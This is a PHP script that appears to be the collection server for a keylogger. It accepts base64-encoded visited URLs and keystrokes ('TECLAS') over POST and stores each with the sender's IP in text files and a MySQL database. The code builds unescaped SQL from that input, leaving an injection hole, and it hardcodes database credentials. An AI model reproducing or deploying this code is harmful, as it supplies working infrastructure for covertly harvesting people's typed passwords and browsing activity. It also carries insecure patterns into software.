<?php
	//datos para la conexion
	$servername = "localhost";
	$database = "LastUrl";
	$username = "phpmyadmin";
	$password = "Temporal1";

	// create connection 

	$conn = mysqli_connect ($servername, $username, $password, $database);

	//check connection 
	if (!$conn){
		die("Connection failed: ". mysqli_connect_error());
	}
	echo ("Connected successfully");

	//recibe los datos
	if (isset($_POST['url']) && !empty($_POST))
	{
		$newIp = getIP();
		//decodificamos la informacion recibida
		$url = base64_decode($_POST['url']);
		//almacena en el fichero1
		$file = fopen('fichero1.txt', 'w');
		fwrite ($file, "$newIp \r\n");
		fwrite ($file, "$url \r\n");
		fclose($file);
		//almacena en la base
		$sql = "INSERT INTO Urls (IP,URL) VALUES ('$newIp','$url')";
		if (mysqli_query ($conn, $sql)){
			echo "New record created successfully";
		}else{
			echo "Error: " . $sql . "<br>" . mysqli_error($conn);
		}

	}
	if (isset($_POST['key']) && !empty($_POST))
	{
		$newIp = getIP();
		//decodificamos la informacion recibida
		$key = base64_decode($_POST['key']);
		//almacena en el fichero2
		$file = fopen('fichero2.txt', 'w');
		fwrite ($file, "$newIp \r\n");
		fwrite ($file, "$key \r\n");
		fclose($file);
		//almacena en la base
		$sql = "INSERT INTO Tecla (IP,TECLAS) VALUES ('$newIp','$key')";
		if (mysqli_query ($conn, $sql)){
			echo "New record created successfully";
		}else{
			echo "Error: " . $sql . "<br>" . mysqli_error($conn);
		}
	}

	//cierra la conexion
	mysqli_close($conn);


	function getIP(){
		$ipClient ='';
		if (getenv('HTTP_CLIENT_IP')){
			$ipClient = getenv('HTTP_CLIENT_IP');
		}
		elseif(getenv('HTTP_X_FORWARDED_FOR')){
			$ipClient = getenv('HTTP_X_FORWARDED_FOR');
		}
		elseif(getenv('HTTP_X_FORWARDED')){
			$ipClient = getenv('HTTP_X_FORWARDED');
		}
		elseif(getenv('HTTP_FORWARDED_FOR')){
			$ipClient = getenv('HTTP_FORWARDED_FOR');
		}
		elseif(getenv('HTTP_FORWARDED')){
			$ipClient = getenv('HTTP_FORWARDED');
		}
		else{
			$ipClient = getenv('REMOTE_ADDR');
		}
		return $ipClient;
	}
?>

